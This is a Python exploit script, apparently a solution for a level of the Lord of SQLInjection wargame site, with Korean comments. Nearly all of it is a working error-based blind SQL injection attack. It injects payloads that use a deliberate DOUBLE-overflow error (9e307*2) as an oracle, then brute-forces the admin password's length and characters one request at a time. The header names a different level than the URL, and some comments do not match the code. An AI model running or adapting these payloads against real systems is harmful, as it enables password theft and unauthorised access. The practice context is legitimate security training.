# LOS
# STEP 20 bugbear


import requests

url ="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?" #공격URL
cookies ={"PHPSESSID": "
"} #쿠키값

#패스워드 길이 찾기
def pw_len():
    len_num = 0

    while 1 :
        len_num = len_num + 1
        value = "' or id = 'admin' and (select if(length(pw)={},9e307*2,0)) #".format(len_num) #injection payload
        parmas = {'pw': value}      #url에 GET으로 전달하는 파라미터
        response = requests.get(url,params=parmas, cookies=cookies)
        print(value)


        if "DOUBLE value is out of range in '(9e307 * 2)'" in response.text:    #응답값에 Hello admin이 있으면 반환
            print("password length : ", len_num)
            break
    return len_num

pw_len()

def pw_real(len_num):
    pw=''
    for i in range(1,len_num+1):
        print(i,"번째 검색 중")

        for j in range(48, 122):  #아스키코드값 48번부터 122번
 
        
            value = "' or id = 'admin' and if(ascii(substr(pw,{},1))={},9e307*2,0) #".format(i,j) #injection payload
            parmas = {'pw':value}
            response = requests.get(url, params=parmas, cookies=cookies)
            print(j)

            if "DOUBLE value is out of range in '(9e307 * 2)'" in response.text:       #응답값에 Hello admin이 있으면 반환
                pw = pw + chr(j)    #chr(): 아스키코드값 -> 문자
                print("password  : ", pw)
                break
    return pw

pw_real(pw_len())
